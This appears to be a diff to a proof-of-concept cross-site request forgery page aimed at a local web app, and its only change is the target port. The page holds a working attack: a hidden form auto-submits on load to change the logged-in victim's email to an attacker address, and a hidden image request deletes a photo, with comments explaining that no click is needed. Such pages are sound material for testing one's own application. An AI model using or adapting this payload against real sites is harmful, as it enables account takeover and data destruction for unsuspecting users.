@@ -11,7 +11,7 @@
   and /api/account/email has no anti-CSRF token, so this silently changes the
   logged-in victim's email the moment this page loads — no click needed.
 -->
-<form id="evil-form" action="http://127.0.0.1:3000/api/account/email" method="POST">
+<form id="evil-form" action="http://127.0.0.1:4567/api/account/email" method="POST">
   <input type="hidden" name="email" value="attacker@evil.example">
 </form>
 
@@ -20,7 +20,7 @@
   the delete endpoint (worst-case CSRF: no even form needed), a plain <img>
   tag is enough. This deletes photo id=1 for whoever is logged in.
 -->
-<img src="http://127.0.0.1:3000/api/photos/1/delete" style="display:none" alt="">
+<img src="http://127.0.0.1:4567/api/photos/1/delete" style="display:none" alt="">
 
 <script>
   document.getElementById('evil-form').submit();
